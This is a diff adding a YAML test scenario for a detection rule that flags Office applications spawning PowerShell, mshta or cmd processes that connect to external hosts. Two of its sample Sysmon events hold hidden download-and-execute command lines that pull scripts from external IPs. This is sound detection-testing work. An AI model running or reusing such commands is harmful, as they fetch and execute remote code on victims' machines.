@@ -1,0 +1,34 @@
+scenario: SCE_Exec_Office_Child_Network
+cases:
+  - name: positive_winword_powershell_connects_out
+    expect_incidents: [exec_office_child_network]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -nop -w hidden -c "iex(iwr http://185.199.108.133/a.ps1)"', ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE', ProcessGuid: "${guid1}", ParentProcessGuid: "${guid2}"}
+      - at: 3
+        event: {EventID: 3, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', ProcessGuid: "${guid1}", Initiated: 1, Protocol: tcp, DestinationIp: 185.199.108.133, DestinationPort: 80}
+  - name: positive_same_second
+    # секундная точность TimeCreated: запуск и соединение в одной секунде, порядок в выборке не определён
+    expect_incidents: [exec_office_child_network]
+    events:
+      - event: {EventID: 3, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\mshta.exe', ProcessGuid: "${guid1}", Initiated: 1, DestinationIp: 45.77.10.10, DestinationPort: 443}
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\mshta.exe', OriginalFileName: MSHTA.EXE, CommandLine: 'mshta http://45.77.10.10/x.hta', ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE', ProcessGuid: "${guid1}"}
+  - name: negative_connection_from_other_process
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE', ProcessGuid: "${guid1}"}
+      - at: 3
+        event: {EventID: 3, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', ProcessGuid: "${guid2}", Initiated: 1, DestinationIp: 185.199.108.133, DestinationPort: 443}
+  - name: negative_private_destination
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\cmd.exe', OriginalFileName: Cmd.Exe, ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE', ProcessGuid: "${guid1}"}
+      - at: 3
+        event: {EventID: 3, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\cmd.exe', ProcessGuid: "${guid1}", Initiated: 1, DestinationIp: 10.0.2.2, DestinationPort: 445}
+  - name: negative_powershell_from_explorer
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, ParentImage: 'C:\Windows\explorer.exe', ProcessGuid: "${guid1}"}
+      - at: 3
+        event: {EventID: 3, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', ProcessGuid: "${guid1}", Initiated: 1, DestinationIp: 185.199.108.133, DestinationPort: 443}
+lab:
+  - 'Office недоступен на стенде: эмуляция через переименованный бинарь не даст ParentImage WINWORD.EXE. Проверять синтетикой или поставить LibreOffice/Office Trial.'
